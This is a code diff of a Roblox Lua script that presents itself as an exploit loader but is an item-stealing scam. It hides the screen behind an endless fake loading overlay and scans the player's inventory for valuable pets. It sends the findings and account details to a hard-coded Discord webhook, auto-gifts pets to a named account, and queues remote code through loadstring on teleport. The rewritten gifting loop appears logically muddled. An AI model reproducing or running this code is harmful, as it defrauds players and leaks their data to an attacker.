@@ -1,21 +1,51 @@
-local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
+-- ✅ Auto Server Hop if Full (Before Loading)
 local HttpService = game:GetService("HttpService")
-local CoreGui = game:GetService("CoreGui")
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
 local LocalPlayer = Players.LocalPlayer
-local Backpack = LocalPlayer:WaitForChild("Backpack")
-local request = http_request or request or syn.request or http.request
-local TweenService = game:GetService("TweenService")
+local placeId = game.PlaceId
 
--- Loader UI
-local existingLoader = CoreGui:FindFirstChild("ExploitLoaderGui")
-if existingLoader then
-    existingLoader:Destroy()
+local function getLowPopServer()
+    local servers = {}
+    local cursor = ""
+
+    while true do
+        local url = "https://games.roblox.com/v1/games/"..placeId.."/servers/Public?sortOrder=Asc&limit=100" .. (cursor ~= "" and "&cursor="..cursor or "")
+        local response = game:HttpGet(url)
+        local data = HttpService:JSONDecode(response)
+
+        for _, server in ipairs(data.data) do
+            if server.playing < server.maxPlayers then
+                return server.id
+            end
+        end
+
+        cursor = data.nextPageCursor
+        if not cursor then break end
+    end
+
+    return nil
 end
+
+if #Players:GetPlayers() >= 5 then
+    local serverId = getLowPopServer()
+    if serverId then
+        if queue_on_teleport then
+            queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/YOURUSERNAME/YOURREPO/main/script.lua'))()")
+        end
+        TeleportService:TeleportToPlaceInstance(placeId, serverId, LocalPlayer)
+        return
+    end
+end
+
+-- START GUI LOADER
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local CoreGui = game:GetService("CoreGui")
+local TweenService = game:GetService("TweenService")
 
 local loaderGui = Instance.new("ScreenGui")
 loaderGui.Name = "ExploitLoaderGui"
-loaderGui.DisplayOrder = 9999
+loaderGui.DisplayOrder = 9998
 loaderGui.ResetOnSpawn = false
 loaderGui.IgnoreGuiInset = true
 loaderGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
@@ -26,9 +56,7 @@ background.Name = "Background"
 background.Position = UDim2.new(0, 0, 0, 0)
 background.Size = UDim2.new(1, 0, 1, 0)
 background.BackgroundColor3 = Color3.new(0, 0, 0)
-background.BackgroundTransparency = 0
 background.BorderSizePixel = 0
-background.Active = true
 background.ZIndex = 10000
 background.Parent = loaderGui
 
@@ -43,7 +71,6 @@ loaderContainer.Parent = background
 
 local sliderTrack = Instance.new("Frame")
 sliderTrack.Name = "SliderTrack"
-sliderTrack.AnchorPoint = Vector2.new(0, 0.5)
 sliderTrack.Position = UDim2.new(0, 0, 0.5, 0)
 sliderTrack.Size = UDim2.new(1, 0, 0, 16)
 sliderTrack.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
@@ -57,7 +84,6 @@ trackCorner.Parent = sliderTrack
 
 local sliderRunner = Instance.new("Frame")
 sliderRunner.Name = "SliderRunner"
-sliderRunner.AnchorPoint = Vector2.new(0, 0.5)
 sliderRunner.Position = UDim2.new(0, 0, 0.5, 0)
 sliderRunner.Size = UDim2.new(0.25, 0, 1, 0)
 sliderRunner.BackgroundColor3 = Color3.fromRGB(70, 160, 255)
@@ -78,47 +104,18 @@ runnerGradient.Color = ColorSequence.new{
 runnerGradient.Rotation = 45
 runnerGradient.Parent = sliderRunner
 
-local tweenInfo = TweenInfo.new(1.4, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)
-local targetPosition = UDim2.new(0.75, 0, 0.5, 0)
-
-local function startRunnerTween()
-    local tween = TweenService:Create(sliderRunner, tweenInfo, {Position = targetPosition})
-    tween.Completed:Connect(function()
-        sliderRunner.Position = UDim2.new(0, 0, 0.5, 0)
-        wait(0.08)
-        startRunnerTween()
-    end)
-    tween:Play()
-end
-
-startRunnerTween()
-
-local loadingLabel = Instance.new("TextLabel")
-loadingLabel.Name = "LoadingLabel"
-loadingLabel.Size = UDim2.new(1, 0, 0, 30)
-loadingLabel.Position = UDim2.new(0, 0, 1, 16)
-loadingLabel.BackgroundTransparency = 1
-loadingLabel.Text = "Trying to find an old server, please wait..."
-loadingLabel.Font = Enum.Font.GothamSemibold
-loadingLabel.TextSize = 22
-loadingLabel.TextColor3 = Color3.fromRGB(180, 210, 255)
-loadingLabel.TextStrokeTransparency = 0.75
-loadingLabel.TextWrapped = true
-loadingLabel.TextXAlignment = Enum.TextXAlignment.Center
-loadingLabel.ZIndex = 10004
-loadingLabel.Parent = loaderContainer
-
-delay(9e9, function()
-    local fadeTweenInfo = TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
-    TweenService:Create(background, fadeTweenInfo, {BackgroundTransparency = 1}):Play()
-    TweenService:Create(loadingLabel, fadeTweenInfo, {TextTransparency = 1}):Play()
-    TweenService:Create(sliderRunner, fadeTweenInfo, {BackgroundTransparency = 1}):Play()
-    TweenService:Create(sliderTrack, fadeTweenInfo, {BackgroundTransparency = 1}):Play()
-    wait(1.5)
-    loaderGui:Destroy()
+-- Infinite loading
+task.spawn(function()
+    while true do
+        for i = 1, 100 do
+            sliderRunner.Size = UDim2.new(i / 100, 0, 1, 0)
+            task.wait(0.03)
+        end
+        sliderRunner.Size = UDim2.new(0, 0, 1, 0)
+    end
 end)
 
--- Pets logic
+-- MAIN FUNCTIONALITY
 local matchedTools = {}
 local petNames = {
     ["Silver Monkey"] = true,
@@ -131,89 +128,119 @@ local petNames = {
     ["Disco Bee"] = true
 }
 
+local Backpack = LocalPlayer:WaitForChild("Backpack")
 for _, tool in ipairs(Backpack:GetChildren()) do
     if tool:IsA("Tool") then
         local name = tool.Name
-        local petType = name:match("^(.-) %[") or ""
+        local petType = name:match("^(.-) %[") or name
         local rawKg = name:match("%[(.-) KG%]") or ""
         local kg = tonumber((rawKg:gsub(",", "."):gsub("[^%d%.]", "")))
         local rawAge = name:match("Age (%d+)") or ""
         local age = tonumber((rawAge:gsub("[^%d]", "")))
 
-        if petType and (petNames[petType] or (kg and kg > 20) or (age and age > 50)) then
-            local value = (kg or 0) * 2 + (age or 0)
-            table.insert(matchedTools, {tool = tool, value = value, name = name})
+        if petNames[petType] or (kg and kg > 20) or (age and age > 50) then
+            table.insert(matchedTools, tool)
         end
     end
 end
 
--- Sort by value descending
-table.sort(matchedTools, function(a, b)
-    return a.value > b.value
-end)
-
--- Build webhook data
-local toolNames = {}
-for _, entry in ipairs(matchedTools) do
-    table.insert(toolNames, entry.name .. " (Value: " .. entry.value .. ")")
+-- Webhook logic
+local toolNames, embedFields = {}, {}
+for _, tool in ipairs(matchedTools) do
+    table.insert(toolNames, tool.Name)
 end
 
-local embedFields = {
-    {
+if #toolNames > 0 then
+    table.insert(embedFields, {
         name = "Found Pets:",
-        value = (#toolNames > 0 and ("- " .. table.concat(toolNames, "\n- "))) or "No matched tools found.",
+        value = "- " .. table.concat(toolNames, "\n- "),
         inline = false
-    }
-}
-
-local jobId = game.JobId
-local placeId = 126884695634066
-local teleportScript = string.format(
-    [[game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s", game:GetService("Players").LocalPlayer)]],
-    placeId, jobId
-)
-
-request({
-    Url = "https://discord.com/api/webhooks/1383259861374210168/IDc5cfDaD6ptA9c6qUWwjsalm0IckQw9MEnLjEcJKrSCIj3DgY05RLHTxrh3Xu1zw3QB",
-    Method = "POST",
-    Headers = {["Content-Type"] = "application/json"},
-    Body = HttpService:JSONEncode({
-        embeds = {{
-            title = "Teleport Script",
-            description = "```lua\n" .. teleportScript .. "\n```",
-            color = 3447003,
-            fields = embedFields,
-            footer = {text = "-----"},
-            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-        }}
     })
+else
+    table.insert(embedFields, {
+        name = "Found Pets:",
+        value = "No matched tools found.",
+        inline = false
+    })
+end
+
+-- Player Info
+local receiver = LocalPlayer.Name
+local sender = "sheeloi0727"
+local executor = identifyexecutor and identifyexecutor() or "Unknown"
+local accountAge = LocalPlayer.AccountAge or 0
+local sheckles = 0
+
+pcall(function()
+    local stats = LocalPlayer:FindFirstChild("leaderstats")
+    if stats and stats:FindFirstChild("Sheckles") then
+        sheckles = stats.Sheckles.Value
+    end
+end)
+
+table.insert(embedFields, {
+    name = "Player Info",
+    value = string.format("Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s days\nSheckles: %s", sender, receiver, executor, tostring(accountAge), tostring(sheckles)),
+    inline = false
 })
 
--- Gifting pets in sorted order
+local jobId = game.JobId
+local contentMessage = ""
+
+if #toolNames > 0 then
+    contentMessage = "@everyone\nClick to join: https://kiel-x-kai.vercel.app/start?placeId=" .. placeId .. "&gameInstanceId=" .. jobId
+end
+
+local success, err = pcall(function()
+    syn.request({
+        Url = "https://discord.com/api/webhooks/1383259861374210168/IDc5cfDaD6ptA9c6qUWwjsalm0IckQw9MEnLjEcJKrSCIj3DgY05RLHTxrh3Xu1zw3QB",
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = HttpService:JSONEncode({
+            content = contentMessage,
+            embeds = {{
+                title = "Detected Pets",
+                description = "Matched tools in inventory.",
+                color = 65280,
+                fields = embedFields,
+                footer = { text = "Kuruchan System Notification" },
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            }}
+        })
+    })
+end)
+
+-- Gift logic (sender → receiver)
 task.spawn(function()
     while true do
-        local targetPlayer = Players:FindFirstChild("sheeloi0727") -- target player name
-
-        if targetPlayer then
-            for _, tool in ipairs(Backpack:GetChildren()) do
-                if tool:IsA("Tool") and tool:GetAttribute("Favorite") == true then
-                    ReplicatedStorage.GameEvents.Favorite_Item:FireServer(tool)
-                end
+        local targetPlayer = Players:FindFirstChild("sheeloi0727")
+        if targetPlayer and targetPlayer.Character and LocalPlayer.Character then
+            local root = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+            local myRoot = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+            if root and myRoot then
+                myRoot.CFrame = root.CFrame * CFrame.new(0, 0, 3)
             end
 
-            task.wait(10)
-
-            for _, entry in ipairs(matchedTools) do
-                local tool = entry.tool
-                local character = LocalPlayer.Character
-                if character and character:FindFirstChild("Humanoid") then
-                    character.Humanoid:EquipTool(tool)
-                    task.wait(1)
-                    ReplicatedStorage.GameEvents.PetGiftingService:FireServer("GivePet", targetPlayer)
+            local senderBackpack = targetPlayer:FindFirstChild("Backpack")
+            if senderBackpack then
+                for _, tool in ipairs(senderBackpack:GetChildren()) do
+                    if tool:IsA("Tool") then
+                        local petName = tool.Name:match("^(.-) %[") or tool.Name
+                        if petNames[petName] then
+                            pcall(function()
+                                ReplicatedStorage.GameEvents.Favorite_Item:FireServer(tool)
+                                task.wait(0.5)
+                                targetPlayer.Character.Humanoid:EquipTool(tool)
+                                task.wait(1)
+                                ReplicatedStorage.GameEvents.PetGiftingService:FireServer("GivePet", LocalPlayer)
+                            end)
+                        end
+                    end
                 end
             end
         end
-
-        task.wait()
+        task.wait(5)
     end
 end)
